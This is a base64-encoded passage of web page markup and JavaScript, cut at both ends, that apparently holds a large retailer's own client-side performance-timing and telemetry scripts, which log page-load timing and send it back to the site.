H0KICAgIDwvc2NyaXB0PgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgICAgIHdpbmRvdy5md2NpbUNtZCA9IFsKCiAgICAgICAgICAgIFsncHJvZmlsZScsICdzaWduSW4nXQoKCiAgICAgICAgXTsKICAgIDwvc2NyaXB0PgoKCiAgICA8IS0tIGNhY2hlIHNsb3QgcmVuZGVyZWQgLS0+Cgo8L2Rpdj4KPGRpdiBpZD0nYmUnIHN0eWxlPSJkaXNwbGF5Om5vbmU7dmlzaWJpbGl0eTpoaWRkZW47Ij4KICAgIDxmb3JtIG5hbWU9J3VlX2JhY2tkZXRlY3QnIGFjdGlvbj0iZ2V0Ij48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSd1ZV9iYWNrJyB2YWx1ZT0nMScvPjwvZm9ybT4KCgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgICAgIHdpbmRvdy51ZV9pYmUgPSAod2luZG93LnVlX2liZSB8fCAwKSArIDE7CiAgICAgICAgaWYgKHdpbmRvdy51ZV9pYmUgPT09IDEpIHsKCiAgICAgICAgICAgIChmdW5jdGlvbiAoZSwgYykgewogICAgICAgICAgICAgICAgZnVuY3Rpb24gaChiLCBhKSB7CiAgICAgICAgICAgICAgICAgICAgZi5wdXNoKFtiLCBhXSkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBnKGIsIGEpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoYikgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYyA9IGUuaGVhZCB8fCBlLmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF0gfHwgZS5kb2N1bWVudEVsZW1lbnQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkID0gZS5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICAgICAgICAgICAgICAgICAgZC5hc3luYyA9ICJhc3luYyI7CiAgICAgICAgICAgICAgICAgICAgICAgIGQuc3JjID0gYjsKICAgICAgICAgICAgICAgICAgICAgICAgZC5zZXRBdHRyaWJ1dGUoImNyb3Nzb3JpZ2luIiwgImFub255bW91cyIpOwogICAgICAgICAgICAgICAgICAgICAgICBhICYmIGEub25lcnJvciAmJiAoZC5vbmVycm9yID0gYS5vbmVycm9yKTsKICAgICAgICAgICAgICAgICAgICAgICAgYSAmJiBhLm9ubG9hZCAmJiAoZC5vbmxvYWQgPSBhLm9ubG9hZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGMuaW5zZXJ0QmVmb3JlKGQsIGMuZmlyc3RDaGlsZCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gaygpIHsKICAgICAgICAgICAgICAgICAgICB1ZS51ZWxzID0gZzsKICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBiID0gMDsgYiA8IGYubGVuZ3RoOyBiKyspIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGEgPSBmW2JdOwogICAgICAgICAgICAgICAgICAgICAgICBnKGFbMF0sIGFbMV0pCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHVlLmRlZmZlcmVkID0gMQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIHZhciBmID0gW107CiAgICAgICAgICAgICAgICBjLnVlICYmICh1ZS51ZWxzID0gaCwgYy51ZS5hdHRhY2ggJiYgYy51ZS5hdHRhY2goImxvYWQiLCBrKSkKICAgICAgICAgICAgfSkoZG9jdW1lbnQsIHdpbmRvdyk7CgoKICAgICAgICAgICAgaWYgKHdpbmRvdy51ZSAmJiB3aW5kb3cudWUudWVscykgewogICAgICAgICAgICAgICAgdWUudWVscygiaHR0cHM6Ly9pbWFnZXMtZmUuc3NsLWltYWdlcy1hbWF6b24uY29tL2ltYWdlcy9JLzMxQlZ1aWRnVDhMLmpzIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgdmFyIHVlX21ibCA9IHVlX2NzbS51ZS5leGVjKGZ1bmN0aW9uIChlLCBhKSB7CiAgICAgICAgICAgICAgICBmdW5jdGlvbiBsKGYpIHsKICAgICAgICAgICAgICAgICAgICBiID0gZiB8fCB7fTsKICAgICAgICAgICAgICAgICAgICBhLkFNWk5QZXJmb3JtYW5jZSA9IGI7CiAgICAgICAgICAgICAgICAgICAgYi50cmFuc2l0aW9uID0gYi50cmFuc2l0aW9uIHx8IHt9OwogICAgICAgICAgICAgICAgICAgIGIudGltaW5nID0gYi50aW1pbmcgfHwge307CiAgICAgICAgICAgICAgICAgICAgZS51ZS5leGVjKG0sICJjc20tYW5kcm9pZC1jaGVjayIpKCkgJiYgYi50YWdzIGluc3RhbmNlb2YgQXJyYXkgJiYgKGYgPSAtMSAhPSBiLnRhZ3MuaW5kZXhPZigidXNlc0FwcFN0YXJ0VGltZSIpIHx8IGIudHJhbnNpdGlvbi50eXBlID8gIWIudHJhbnNpdGlvbi50eXBlICYmIC0xIDwgYi50YWdzLmluZGV4T2YoInVzZXNBcHBTdGFydFRpbWUiKSA/ICJ3YXJtLXN0YXJ0IiA6IHZvaWQgMCA6ICJ2aWV3LXRyYW5zaXRpb24iLCBmICYmIChiLnRyYW5zaXRpb24udHlwZSA9IGYpKTsKICAgICAgICAgICAgICAgICAgICAicmVsb2FkIiA9PT0gYy5fbnQgJiYgZS51ZV9vcmN0IHx8ICJpbnRyYXBhZ2UtdHJhbnNpdGlvbiIgPT09IGMuX250ID8gYS5wZXJmb3JtYW5jZSAmJiBwZXJmb3JtYW5jZS50aW1pbmcgJiYgcGVyZm9ybWFuY2UudGltaW5nLm5hdmlnYXRpb25TdGFydCA/CiAgICAgICAgICAgICAgICAgICAgICAgIGIudGltaW5nLnRyYW5zaXRpb25TdGFydCA9IGEucGVyZm9ybWFuY2UudGltaW5nLm5hdmlnYXRpb25TdGFydCA6IGRlbGV0ZSBiLnRpbWluZy50cmFuc2l0aW9uU3RhcnQgOiAidW5kZWZpbmVkIiA9PT0gdHlwZW9mIGMuX250ICYmIGEucGVyZm9ybWFuY2UgJiYgcGVyZm9ybWFuY2UudGltaW5nICYmIHBlcmZvcm1hbmNlLnRpbWluZy5uYXZpZ2F0aW9uU3RhcnQgJiYgYS5oaXN0b3J5ICYmICJmdW5jdGlvbiIgPT09IHR5cGVvZiBhLkhpc3RvcnkgJiYgIm9iamVjdCIgPT09IHR5cGVvZiBhLmhpc3RvcnkgJiYgaGlzdG9yeS5sZW5ndGggJiYgMSAhPSBoaXN0b3J5Lmxlbmd0aCAmJiAoYi50aW1pbmcudHJhbnNpdGlvblN0YXJ0ID0gYS5wZXJmb3JtYW5jZS50aW1pbmcubmF2aWdhdGlvblN0YXJ0KTsKICAgICAgICAgICAgICAgICAgICBmID0gYi50cmFuc2l0aW9uOwogICAgICAgICAgICAgICAgICAgIHZhciBkOwogICAgICAgICAgICAgICAgICAgIGQgPSBjLl9udCA/IGMuX250IDogdm9pZCAwOwogICAgICAgICAgICAgICAgICAgIGYuc3ViVHlwZSA9IGQ7CiAgICAgICAgICAgICAgICAgICAgYS51ZSAmJiBhLnVlLnRhZyAmJiBhLnVlLnRhZygiaGFzLUFNWk5QZXJmb3JtYW5jZSIpOwogICAgICAgICAgICAgICAgICAgIGMuaXNsICYmIGEudWV4ICYmIHVleCgiYXQiLCAiY3NtLXRpbWluZyIpOwogICAgICAgICAgICAgICAgICAgIG4oKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHAoYikgewogICAgICAgICAgICAgICAgICAgIGEudWUgJiYgYS51ZS5jb3VudCAmJiBhLnVlLmNvdW50KCJjc20tY29yZG92YS1wbHVnaW4tZmFpbGVkIiwgMSkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBtKCkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBhLndlYmNsaWVudCAmJiAiZnVuY3Rpb24iID09PSB0eXBlb2YgYS53ZWJjbGllbnQuZ2V0UmVhbENsaWNrVGltZSA/IGEuY29yZG92YSAmJiBhLmNvcmRvdmEucGxhdGZvcm1JZCAmJiAiaW9zIiA9PSBhLmNvcmRvdmEucGxhdGZvcm1JZCA/ICExIDogITAgOiAhMQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIG4oKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgUC5yZWdpc3RlcigiQU1aTlBlcmZvcm1hbmNlIiwgZnVuY3Rpb24gKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGIKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIChhKSB7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGgoKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCFiKSByZXR1cm4gIiI7CiAgICAgICAgICAgICAgICAgICAgdWVfbWJsLmNudCA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgYSA9IGIudGltaW5nLCBkID0gYi50cmFuc2l0aW9uLCBhID0gWyJtdHMiLCBrKGEudHJhbnNpdGlvblN0YXJ0KSwgIm1wcyIsIGsoYS5wcm9jZXNzU3RhcnQpLCAibXR0IiwgZC50eXBlLCAibXRzdCIsIGQuc3ViVHlwZSwgIm10bHQiLCBkLmxhdW5jaFR5cGVdLCBkID0gIiIsIGMgPSAwOyBjIDwKICAgICAgICAgICAgICAgICAgICBhLmxlbmd0aDsgYyArPSAyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBlID0gYVtjXSwgZyA9IGFbYyArIDFdOwogICAgICAgICAgICAgICAgICAgICAgICAidW5kZWZpbmVkIiAhPT0gdHlwZW9mIGcgJiYgKGQgKz0gIiYiICsgZSArICI9IiArIGcpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBkCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gayhhKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCJ1bmRlZmluZWQiICE9PSB0eXBlb2YgYSAmJiAidW5kZWZpbmVkIiAhPT0gdHlwZW9mIGcpIHJldHVybiBhIC0gZwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIHEoYSwgYykgewogICAgICAgICAgICAgICAgICAgIGIgJiYgKGcgPSBjLCBiLnRpbWluZy50cmFuc2l0aW9uU3RhcnQgPSBhLCBiLnRyYW5zaXRpb24udHlwZSA9ICJ2aWV3LXRyYW5zaXRpb24iLCBiLnRyYW5zaXRpb24uc3ViVHlwZSA9ICJhamF4LXRyYW5zaXRpb24iLCBiLnRyYW5zaXRpb24ubGF1bmNoVHlwZSA9ICJub3JtYWwiLCB1ZV9tYmwuY250ID0gaCkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB2YXIgYyA9IGUudWUgfHwge30sIGcgPSBlLnVlX3QwLCBiOwogICAgICAgICAgICAgICAgaWYgKGEuUCAmJiBhLlAud2hlbiAmJiBhLlAucmVnaXN0ZXIpIHJldHVybiBhLlAud2hlbigiQ1NNUGx1Z2luIikuZXhlY3V0ZShmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgIGEuYnVpbGRBTVpOUGVyZm9ybWFuY2UgJiYgYS5idWlsZEFNWk5QZXJmb3JtYW5jZSh7CiAgICAgICAgICAgICAgICAgICAgICAgIHN1Y2Nlc3NDYWxsYmFjazogbCwKICAgICAgICAgICAgICAgICAgICAgICAgZmFpbENhbGxiYWNrOiBwCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0pLCB7Y250OiBoLCBhamF4OiBxfQogICAgICAgICAgICB9LCAibW9iaWxlLXRpbWluZyIpKHVlX2NzbSwgd2luZG93KTsKCiAgICAgICAgICAgIChmdW5jdGlvbiAoZCkgewogICAgICAgICAgICAgICAgZC5fdWVzcyA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICB2YXIgYSA9ICIiOwogICAgICAgICAgICAgICAgICAgIHNjcmVlbiAmJiBzY3JlZW4ud2lkdGggJiYgc2NyZWVuLmhlaWdodCAmJiAoYSArPSAiJnN3PSIgKyBzY3JlZW4ud2lkdGggKyAiJnNoPSIgKyBzY3JlZW4uaGVpZ2h0KTsKICAgICAgICAgICAgICAgICAgICB2YXIgYiA9IGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBiID0gZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50WyJjbGllbnQiICsgYV07CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAiQ1NTMUNvbXBhdCIgPT09IGRvY3VtZW50LmNvbXBhdE1vZGUgJiYgYiB8fCBkb2N1bWVudC5ib2R5WyJjbGllbnQiICsgYV0gfHwgYgogICAgICAgICAgICAgICAgICAgIH0sIGMgPSBiKCJXaWR0aCIpLCBiID0gYigiSGVpZ2h0Iik7CiAgICAgICAgICAgICAgICAgICAgYyAmJiBiICYmIChhICs9ICImdnc9IiArIGMgKyAiJnZoPSIgKyBiKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gYQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KSh1ZV9jc20pOwoKICAgICAgICAgICAgKGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICB2YXIgYiA9IGRvY3VtZW50LnVlX2JhY2tkZXRlY3Q7CiAgICAgICAgICAgICAgICBiICYmIGIudWVfYmFjayAmJiBhLnVlICYmIChhLnVlLmJmaW5pID0gYi51ZV9iYWNrLnZhbHVlKTsKICAgICAgICAgICAgICAgIGEudWV0ICYmIGEudWV0KCJiZSIpOwogICAgICAgICAgICAgICAgYS5vbkxkRW5kICYmICh3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lciA/IHdpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwgYS5vbkxkRW5kLCAhMSkgOiB3aW5kb3cuYXR0YWNoRXZlbnQgJiYgd2luZG93LmF0dGFjaEV2ZW50KCJvbmxvYWQiLCBhLm9uTGRFbmQpKTsKICAgICAgICAgICAgICAgIGEudWVoICYmIGEudWVoKDAsIHdpbmRvdywgImxvYWQiLCBhLm9uTGQsIDEpOwogICAgICAgICAgICAgICAgYS51ZSAmJiBhLnVlLnRhZyAmJiAoYS51ZV9mdXJsID8gKGIgPSBhLnVlX2Z1cmwucmVwbGFjZSgvXC4vZywgIi0iKSwgYS51ZS50YWcoYikpIDogYS51ZS50YWcoIm5vZmxzIikpCiAgICAgICAgICAgIH0pKHVlX2NzbSk7CgogICAgICAgICAgICAoZnVuY3Rpb24gKGcsIGgpIHsKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGQoYSwgZCkgewogICAgICAgICAgICAgICAgICAgIHZhciBiID0ge307CiAgICAgICAgICAgICAgICAgICAgaWYgKCFlIHx8ICFmKSB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgYyA9IGguc2Vzc2lvblN0b3JhZ2U7CiAgICAgICAgICAgICAgICAgICAgICAgIGMgPyBhICYmICgidW5kZWZpbmVkIiAhPT0gdHlwZW9mIGQgPyBjLnNldEl0ZW0oYSwgZCkgOiBiLnZhbCA9IGMuZ2V0SXRlbShhKSkgOiBmID0gMQogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZSA9IDEKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZSAmJiAoYi5lID0gMSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGIKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB2YXIgYiA9IGcudWUgfHwge30sIGEgPSAiIiwgZiwgZSwgYywgYSA9IGQoImNzbXRpZCIpOwogICAgICAgICAgICAgICAgZiA/IGEgPSAiTkEiIDogYS5lID8gYSA9ICJFVCIgOiAoYSA9IGEudmFsLCBhIHx8IChhID0gYi5vaWQgfHwgIk5JIiwgZCgiY3NtdGlkIiwgYSkpLCBjID0gZChiLm9pZCksIGMuZSB8fCAoYy52YWwgPSBjLnZhbCB8fCAwLCBkKGIub2lkLCBjLnZhbCArIDEpKSwgYi5zc3cgPSBkKTsKICAgICAgICAgICAgICAgIGIudGFiaWQgPSBhCiAgICAgICAgICAgIH0pKHVlX2NzbSwgd2luZG93KTsKICAgICAgICAgICAgdWVfY3NtLnVlLmV4ZWMoZnVuY3Rpb24gKGUsIGYpIHsKICAgICAgICAgICAgICAgIHZhciBhID0gZS51ZSB8fCB7fSwgYiA9IGEuX3dsbywgZDsKICAgICAgICAgICAgICAgIGlmIChhLnNzdykgewogICAgICAgICAgICAgICAgICAgIGQgPSBhLnNzdygiQ1NNX3ByZXZpb3VzVVJMIikudmFsOwogICAgICAgICAgICAgICAgICAgIHZhciBjID0gZi5sb2NhdGlvbiwgYiA9IGIgPyBiIDogYyAmJiBjLmhyZWYgPyBjLmhyZWYuc3BsaXQoIiMiKVswXSA6IHZvaWQgMDsKICAgICAgICAgICAgICAgICAgICBjID0gKGIgfHwgIiIpID09PSBhLnNzdygiQ1NNX3ByZXZpb3VzVVJMIikudmFsOwogICAgICAgICAgICAgICAgICAgICFjICYmIGIgJiYgYS5zc3coIkNTTV9wcmV2aW91c1VSTCIsIGIpOwogICAgICAgICAgICAgICAgICAgIGQgPSBjID8gInJlbG9hZCIgOiBkID8gImludHJhcGFnZS10cmFuc2l0aW9uIiA6ICJmaXJzdC12aWV3IgogICAgICAgICAgICAgICAgfSBlbHNlIGQgPSAidW5rbm93biI7CiAgICAgICAgICAgICAgICBhLl9udCA9IGQKICAgICAgICAgICAgfSwgIk5hdlR5cGVNb2R1bGUiKSh1ZV9jc20sIHdpbmRvdyk7CiAgICAgICAgICAgIHVlX2NzbS51ZS5leGVjKGZ1bmN0aW9uIChjLCBhKSB7CiAgICAgICAgICAgICAgICBmdW5jdGlvbiBnKGEpIHsKICAgICAgICAgICAgICAgICAgICBhLnJ1bihmdW5jdGlvbiAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICBkLnRhZygiY3NtLWZlYXR1cmUtIiArIGEubmFtZSArICI6IiArIGUpOwogICAgICAgICAgICAgICAgICAgICAgICBkLmlzbCAmJiBjLnVleCgiYXQiKQogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKGEuYWRkRXZlbnRMaXN0ZW5lcikgZm9yICh2YXIgZCA9IGMudWUgfHwge30sIGYgPSBbewogICAgICAgICAgICAgICAgICAgIG5hbWU6ICJ0b3VjaC1lbmFibGVkIiwgcnVuOiBmdW5jdGlvbiAoYikgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgZSA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEucmVtb3ZlRXZlbnRMaXN0ZW5lcigidG91Y2hzdGFydCIsIGMsICEwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGEucmVtb3ZlRXZlbnRMaXN0ZW5lcigibW91c2Vtb3ZlIiwgZCwgITApCiAgICAgICAgICAgICAgICAgICAgICAgIH0sIGMgPSBmdW5jdGlvbiAoKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBiKCJ0cnVlIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlKCkKICAgICAgICAgICAgICAgICAgICAgICAgfSwgZCA9IGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGIoImZhbHNlIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlKCkKICAgICAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICAgICAgYS5hZGRFdmVudExpc3RlbmVyKCJ0b3VjaHN0YXJ0IiwgYywgITApOwogICAgICAgICAgICAgICAgICAgICAgICBhLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlbW92ZSIsIGQsICEwKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH1dLCBiID0gMDsgYiA8IGYubGVuZ3RoOyBiKyspIGcoZltiXSkKICAgICAgICAgICAgfSwgImNzbS1mZWF0dXJlcyIpKHVlX2NzbSwgd2luZG93KTsKCgogICAgICAgICAgICAoZnVuY3Rpb24gKGIsIGMpIHsKICAgICAgICAgICAgICAgIHZhciBhID0gYy5pbWFnZXM7CiAgICAgICAgICAgICAgICBhICYmIGEubGVuZ3RoICYmIGIudWUuY291bnQoInRvdGFsSW1hZ2VzIiwgYS5sZW5ndGgpCiAgICAgICAgICAgIH0pKHVlX2NzbSwgZG9jdW1lbnQpOwogICAgICAgICAgICAoZnVuY3Rpb24gKGIpIHsKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGMoKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGQgPSBbXTsKICAgICAgICAgICAgICAgICAgICBhLmxvZyAmJiBhLmxvZy5pc1N0dWIgJiYgYS5sb2cucmVwbGF5KGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGUoZCwgYSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICBhLmNsb2cgJiYgYS5jbG9nLmlzU3R1YiAmJiBhLmNsb2cucmVwbGF5KGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGUoZCwgYSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICBkLmxlbmd0aCAmJiAoYS5fZmxocyArPSAxLCBuKGQpLCBwKGQpKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGcoKSB7CiAgICAgICAgICAgICAgICAgICAgYS5sb2cgJiYgYS5sb2cuaXNTdHViICYmIChhLm9uZmx1c2ggJiYgYS5vbmZsdXNoLnJlcGxheSAmJiBhLm9uZmx1c2gucmVwbGF5KGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGFbMF0oKQogICAgICAgICAgICAgICAgICAgIH0pLCBhLm9udW5sb2FkICYmIGEub251bmxvYWQucmVwbGF5ICYmIGEub251bmxvYWQucmVwbGF5KGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGFbMF0oKQogICAgICAgICAgICAgICAgICAgIH0pLCBjKCkpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gZShkLCBiKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGMgPSBiWzFdLCBmID0gYlswXSwgZSA9IHt9OwogICAgICAgICAgICAgICAgICAgIGEuX2xwbltjXSA9IChhLl9scG5bY10gfHwgMCkgKyAxOwogICAgICAgICAgICAgICAgICAgIGVbY10gPSBmOwogICAgICAgICAgICAgICAgICAgIGQucHVzaChlKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIG4oYikgewogICAgICAgICAgICAgICAgICAgIHEgJiYgKGEuX2xwbi5jc20gPSAoYS5fbHBuLmNzbSB8fCAwKSArIDEsIGIucHVzaCh7CiAgICAgICAgICAgICAgICAgICAgICAgIGNzbTogewogICAgICAgICAgICAgICAgICAgICAgICAgICAgazogImNoayIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmOiBhLl9mbGhzLCBsOiBhLl9scG4sIHM6ICJpbmxuIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSkpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gcChhKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGgpIGEgPSBrKGEpLCBiLm5hdmlnYXRvci5zZW5kQmVhY29uKGwsIGEpOyBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgYSA9IGsoYSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBjID0gbmV3IGJbZl07CiAgICAgICAgICAgICAgICAgICAgICAgIGMub3BlbigiUE9TVCIsIGwsICEwKTsKICAgICAgICAgICAgICAgICAgICAgICAgYy5zZXRSZXF1ZXN0SGVhZGVyICYmIGMuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC10eXBlIiwgInRleHQvcGxhaW4iKTsKICAgICAgICAgICAgICAgICAgICAgICAgYy5zZW5kKGEpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGZ1bmN0aW9uIGsoYSkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBKU09OLnN0cmluZ2lmeSh7CiAgICAgICAgICAgICAgICAgICAgICAgIHJpZDogYi51ZV9pZCwKICAgICAgICAgICAgICAgICAgICAgICAgc2lkOiBiLnVlX3NpZCwKICAgICAgICAgICAgICAgICAgICAgICAgbWlkOiBiLnVlX21pZCwKICAgICAgICAgICAgICAgICAgICAgICAgbWt0OiBiLnVlX21rdCwKICAgICAgICAgICAgICAgICAgICAgICAgc246IGIudWVfc24sCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcXM6IGEKICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgfQoKCiAgICAgICAgICAgIChmdW5jdGlvbiAoaywgYykgewogICAgICAgICAgICAgICAgZnVuY3Rpb24gbChhLCBiKSB7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEuZmlsdGVyKGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhLmluaXRpYXRvclR5cGUgPT0gYgogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgZnVuY3Rpb24gZihhLCBjKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGIudFthXSkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgZyA9IGIudFthXSAtIGIuX3QwLCBlID0gYy5maWx0ZXIoZnVuY3Rpb24gKGEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAwICE9PSBhLnJlc3BvbnNlRW5kICYmIG0oYSkgPCBnCiAgICAgICAgICAgICAgICAgICAgICAgIH0pLCBmID0gbChlLCAic2NyaXB0IiksIGggPSBsKGUsICJsaW5rIiksIGsgPSBsKGUsICJpbWciKSwgbiA9IGUubWFwKGZ1bmN0aW9uIChhKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYS5uYW1lLnNwbGl0KCIvIilbMl0KICAgICAgICAgICAgICAgICAgICAgICAgfSkuZmlsdGVyKGZ1bmN0aW9uIChhLCBiLCBjKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gYSAmJiBjLmxhc3RJbmRleE9mKGEpID09IGIKICAgICAgICAgICAgICAgICAgICAgICAgfSksIHEgPSBlLmZpbHRlcihmdW5jdGlvbiAoYSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGEuZHVyYXRpb24gPCBwCiAgICAgICAgICAgICAgICAgICAgICAgIH0pLCBzID0gZyAtIE1hdGgubWF4LmFwcGx5KG51bGwsIGUubWFwKG0pKSA8IHIgfCAwOwogICAgICAgICAgICAgICAgICAgICAgICAiYWYiID09IGEgJiYgKGIuX2FmanMgPSBmLmxlbmd0aCk7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhICsgIjoiICsgW2VbZF0sIGZbZF0sIGhbZF0sIGtbZF0sIG5bZF0sIHFbZF0sIHNdLmpvaW4oIi0iKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBtKGEpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gYS5yZXNwb25zZUVuZCAtIChiLl90MCAtIGMudGltaW5nLm5hdmlnYXRpb25TdGFydCkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBmdW5jdGlvbiBuKCkgewogICAgICAgICAgICAgICAgICAgIHZhciBhID0gY1toXSgicmVzb3VyY2UiKSwgZCA9IGYoImNmIiwgYSksIGcgPSBmKCJhZiIsIGEpLCBhID0gZigibGQiLCBhKTsKICAgICAgICAgICAgICAgICAgICBkZWxldGUgYi5fcnQ7CiAgICAgICAgICAgICAgICAgICAgYi5fbGQgPSBiLnQubGQgLSBiLl90MDsKICAgICAgICAgICAgICAgICAgICBiLl9hcnQgJiYgYi5fYXJ0KCk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFtkLCBnLCBhXS5qb2luKCJfIikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB2YXIgcCA9IDIwLCByID0gNTAsIGQgPSAibGVuZ3RoIiwgYiA9IGsudWUsIGggPSAiZ2V0RW50cmllc0J5VHlwZSI7CiAgICAgICAgICAgICAgICBiLl9ycmUgPSBtOwogICAgICAgICAgICAgICAgYi5fcnQgPSBjICYmIGMudGltaW5nICYmIGNbaF0gJiYgbgogICAgICAgICAgICB9KSh1ZV9jc20sIHdpbmRvdy5wZXJmb3JtYW5jZSk7CgoKICAgICAgICAgICAgdWVfY3NtLnVlL